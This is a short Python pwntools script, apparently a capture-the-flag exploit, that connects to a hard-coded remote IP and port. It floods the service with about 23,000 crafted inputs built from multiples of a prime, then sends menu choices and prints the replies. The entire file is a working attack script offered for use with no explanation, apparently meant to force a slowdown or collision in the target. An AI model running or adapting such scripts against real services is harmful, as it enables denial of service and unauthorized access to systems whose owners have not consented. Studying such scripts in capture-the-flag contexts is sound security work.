from pwn import *

r = remote("35.247.145.55", 10527)

print(r.clean().decode())

prime = 42043 # 60s
count = 23000

with log.progress("Sending payload") as p:
  for i in range(1, count):
    p.status("Sending %d" % i)
    r.sendline(b"0")
    r.sendline("{} {}".format(i*prime, 1).encode())

r.sendline(b"1")
print(r.recvline())
r.sendline(b"2")
print(r.recvline())
print(r.recvline())
